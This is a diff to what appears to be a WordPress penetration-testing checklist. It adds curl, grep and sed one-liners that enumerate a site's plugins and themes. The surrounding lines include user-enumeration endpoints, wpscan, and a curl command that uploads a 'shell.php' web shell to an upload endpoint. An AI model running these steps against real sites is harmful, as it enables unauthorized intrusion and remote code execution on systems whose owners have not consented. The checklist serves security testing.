@@ -114,6 +114,13 @@ echo "<pre>$output</pre>";
 - [x] __Check for the `/wp-json` or `/wp-json/wp/v2/user` if is not working `xmlrpc.php`__
 - [x] __Check for the `changelog.txt` or `CHANGELOG.txt`__
 - [x] __wpscan --url <url>__
+
+- [ ] __1. Plugin Enumeration__
+  - __`curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/plugins/' | sed -E 's, href=| src=, THIIIIS, g' | awk -F "THIIIIS" '{print$2}' | cut -d "'" -f2`__
+- [ ] __2. Theme Enumeration__
+  - __`curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/themes' | sed -E 's, href=|src=, THIIIIS,g' | awk -F "THIIIIS" '{print$2}' | cut -d "'" -f2`__
+     
+  - 
 - __`<url>/wp-content/uploads`__
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
